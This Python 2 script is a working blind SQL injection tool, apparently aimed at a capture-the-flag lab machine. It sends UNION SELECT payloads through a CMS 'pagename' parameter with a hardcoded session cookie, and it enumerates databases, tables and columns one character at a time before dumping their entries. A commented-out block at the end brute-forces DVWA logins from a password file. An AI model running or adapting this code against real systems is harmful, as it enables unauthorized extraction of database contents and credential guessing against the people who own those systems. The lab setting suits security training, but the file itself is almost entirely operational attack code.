from urlparse import urlparse
from httplib import HTTPConnection
import sys

def testForBool(injectionPoint):
	path = urlparts.path + "?pagename="+injectionPoint
	conn.request("GET", path,"", {'Cookie': cookie})
	resp = conn.getresponse()
	body = resp.read()
	found = body.find('90')
	if found != -1:
		return True
	else:
		return False

def backTrack():
	global currentCharIndex,nameStack,charIndexStack,length
	currentCharIndex = charIndexStack[-1] + 1
	nameStack = nameStack[:-1]
	charIndexStack.pop()
	length -= 1
		
characters_name = "0123456789abcdefghijklmnopqrstuvwxyz_"
characters_sub = "0123456789abcdefghijklmnopqrstuvwxyz!#$%&*+,-.:;?@[\^_{|}~"
characters_full = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
opt = sys.argv[1]

if opt == "dbs":
	obj_name = "database"
	base_injection = "%27%20UNION%20SELECT%2090%20FROM%20information_schema.schemata%20WHERE%20substring(schema_name,"
	base_injection2 = "%27%20UNION%20SELECT%2090%20FROM%20information_schema.schemata%20WHERE%20schema_name%20=%20%27"
	characters = characters_name
	print "Dumping databases"
if opt == "tables":
	obj_name = "tables"
	db = sys.argv[2]
	base_injection = "%27%20UNION%20SELECT%2090%20FROM%20information_schema.tables%20WHERE%20table_schema=%27"+db+"%27%20AND%20substring(table_name,"
	base_injection2 = "%27%20UNION%20SELECT%2090%20FROM%20information_schema.tables%20WHERE%20table_schema=%27"+db+"%27%20AND%20table_name%20=%20%27"
	characters = characters_name
	print "Dumping tables"
if opt == "columns":
	obj_name = "columns"
	db = sys.argv[2]
	table = sys.argv[3]
	base_injection = "%27%20UNION%20SELECT%2090%20FROM%20information_schema.columns%20WHERE%20table_schema=%27"+db+"%27%20AND%20table_name=%27"+table+"%27%20AND%20substring(column_name,"
	base_injection2 = "%27%20UNION%20SELECT%2090%20FROM%20information_schema.columns%20WHERE%20table_schema=%27"+db+"%27%20AND%20table_name=%27"+table+"%27%20AND%20column_name%20=%20%27"
	characters = characters_name
	print "Dumping columns"
if opt == "dump":
	obj_name = "entry"
	db = sys.argv[2]
	table = sys.argv[3]
	column = sys.argv[4]
	base_injection = "%27%20UNION%20SELECT%2090%20from%20"+db+"."+table+"%20where%20substring("+column+","
	base_injection2 = "%27%20UNION%20SELECT%2090%20from%20"+db+"."+table+"%20where%20"+column+"%20=%27"	
	characters = characters_sub
	print "Dumping entries"
			
		
url = "http://192.168.110.133/imfadministrator/cms.php?pagename="
cookie = "PHPSESSID=sri38rr8ia7cpba5qa86ft5kg7"
urlparts = urlparse(url)
conn = HTTPConnection(urlparts.netloc, urlparts.port or 80)
startIndex = 1
length = 1
currentCharIndex = 0
nameStack = ""
charIndexStack = []

while True:
	if currentCharIndex >= len(characters):
		backTrack()
		continue
	char = characters[currentCharIndex]
	injectionPoint = base_injection+str(startIndex)+","+str(length)+")=%27"+nameStack+char
	#print injectionPoint
	#print nameStack + char
	found = testForBool(injectionPoint)
	if found:
		charIndexStack.append(currentCharIndex)
		nameStack += char
		length += 1
		currentCharIndex = 0
	else:
		currentCharIndex += 1
	injectionPoint2 = base_injection2+nameStack
	completed = testForBool(injectionPoint2)
	if completed:
		print obj_name+" found "+nameStack
		backTrack()


'''
with open(passwordfile) as f:
	content = f.readlines()
	
for password in content:
	password = password.strip()
	url = "http://10.6.66.42/dvwa/vulnerabilities/brute/index.php?username="+user+"&password="+password+"&Login=Login&user_token="+token+"#"
	conn.request("GET", url, data, {'Cookie': cookie})
	resp = conn.getresponse()
	body = resp.read()
	index_wrong = body.find('incorrect')
	index_correct = body.find('Welcome')
	if index_wrong != -1:
		print "Wrong username and password for "+user+":"+password
	elif index_correct != -1:
		print "Correct username and password for "+user+":"+password
	else:
		print "Unexpected Response"
	token = getTokenFromBody(body)
'''